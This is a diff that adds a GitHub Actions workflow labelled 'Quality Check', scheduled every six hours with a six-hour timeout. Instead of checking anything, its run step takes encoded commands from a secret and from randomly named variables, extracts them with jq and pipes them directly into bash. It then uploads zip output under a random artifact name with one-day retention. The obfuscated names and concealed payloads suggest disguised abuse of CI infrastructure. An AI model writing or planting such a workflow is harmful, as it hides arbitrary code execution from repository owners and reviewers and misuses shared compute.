@@ -1,0 +1,36 @@
+name: Quality Check
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '37 0,6,12,18 * * *'
+permissions:
+  contents: read
+  actions: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  trigger:
+    name: Run task
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Start
+        env:
+          gvo1: ${{ secrets.gvo1 }}
+        run: |
+          printf '%s' "$gvo1" | jq -r .q272 | /bin/bash
+          printf '%s' "$zfzqm806" | jq -r .zul406 | /bin/bash
+          printf '%s' "$ay9558" | jq -r .udt17 | /bin/bash
+          echo $fjp35348 | jq -r .kgsy156 | /bin/bash
+
+      - name: Save output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: Pwiu4bfC
+          path: "*.zip"
+          retention-days: 1
